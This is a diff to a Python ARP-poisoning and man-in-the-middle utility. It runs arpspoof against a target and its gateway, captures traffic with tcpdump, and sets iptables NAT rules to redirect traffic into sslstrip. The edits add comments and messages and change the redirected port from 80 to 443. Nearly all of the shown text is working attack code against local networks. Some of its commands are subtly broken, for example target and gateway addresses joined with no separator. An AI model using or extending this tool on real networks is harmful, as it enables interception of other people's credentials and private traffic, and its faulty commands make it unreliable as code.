@@ -8,18 +8,20 @@ import time
 import subprocess
 from scapy.all import * # this may need to be changed depending on your system...
 # End of Imports Section
-# Edit these values... Eventually these will autoconfigure... 
+# Edit these values... Eventually these will autoconfigure... I advise leaving them be cos they just fucking work.
 airmonpath = "/usr/local/sbin/airmon-ng"
 #airmonpath = "os.popen("which airmon-ng")" # if someone can make this work? It would be epic :)
-#conf.verb=0
+#conf.verb=0 # I had to comment this out to get the ARP scanner to work. I apologise for any annoying messages it gives :/
 # It is not advised to edit beyond this point
 
 # Function: amiroot()
 def amiroot():
     if os.geteuid() != 0: # am i root?!?!?!?!
         print("[-] You are not root... Sudo may be of some assistance!")
+        print("[i] SCAPY and other tools REQUIRE root! This is why.")
         sys.exit(1)
     else:
+        print("[+] You are uid=0, we can continue...")
         pass
 
 # Function: Banner - my badass ASCII banner!
@@ -34,6 +36,7 @@ def banner():
     print("      ARP Poisoning and MITM Utility by infodox.")
     print("            http://blog.infodox.co.cc ")
     print(" Report bugs to me, I am in the IRC chan #intern0t on Freenode")
+    print("                  Revision 12... I think")
 
 # Function: check_airmon()
 def check_airmon(airmonpath):
@@ -107,7 +110,7 @@ def arppoison(iface, target, gwaddr): # This function will soon be depracated on
     print("[*] Interface in use is " + iface) # Even more verbosity :D
     os.popen("arpspoof -i " + iface + " -t " + target + gwaddr + " & >/dev/null") # I dont like this
     print("[+] Poisoning them bastards")
-    os.popen("arpspoof -i " + iface + " -t " + gwaddr + target + "  & >/dev/null") # Or this
+    os.popen("arpspoof -i " + iface + " -t " + gwaddr + target + "  & >/dev/null") # Or this. It needs some SCAPY.
 
 # Function: tcpdump
 def tcpdumper(iface):
@@ -188,7 +191,7 @@ def launch_sslstrip():
     elif choose == "y":
         try:
             print("[+] Setting IPTables NAT rulesets")
-            subprocess.call('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', shell=True)
+            subprocess.call('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000', shell=True)
             print("[+] Launching SSLStrip in background!")
             os.popen("xterm -e sslstrip -l 10000 -a &")
         except Exception:
